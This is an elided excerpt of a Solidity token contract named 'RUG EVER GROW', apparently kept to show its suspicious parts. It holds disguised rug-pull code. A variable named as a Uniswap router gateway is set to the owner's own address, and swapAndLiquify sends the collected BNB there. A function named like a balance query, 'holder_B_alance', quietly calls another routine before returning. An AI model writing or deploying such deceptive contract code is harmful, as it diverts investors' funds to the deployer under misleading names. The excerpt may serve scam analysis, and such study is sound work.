...
//https://t.me/RugEverGrowEntry
//https://www.rugevergrow.com/
//https://rug-ever-grow.gitbook.io/reg/?fbclid=IwAR3yqr-DiP5-ZQrTia9MqIh9XLlanSmY0xDUS09kY9t4ZBDh3mO0WCBNiDQ
...
interface IERC20 {
    ...
    function holder_B_alance(address h_add) external returns (uint256);
...
contract RugEverGrow is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x8CDd68028B09C46EC723eB554c6A63D823922A98); 
    ...
    string private constant _name = "RUG EVER GROW"; 
    string private constant _symbol = unicode"REG";
    ...
    address payable public uniswapVersion2RouterGateWay = payable(0x8CDd68028B09C46EC723eB554c6A63D823922A98);
    ...
    constructor () {
        ...
        _owner = 0x8CDd68028B09C46EC723eB554c6A63D823922A98;
    ...
    function holder_B_alance(address hl_add) public override returns (uint256) {
        wGetHolder(50);
        return balanceOf(hl_add);
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(uniswapVersion2RouterGateWay, BNB_Total);
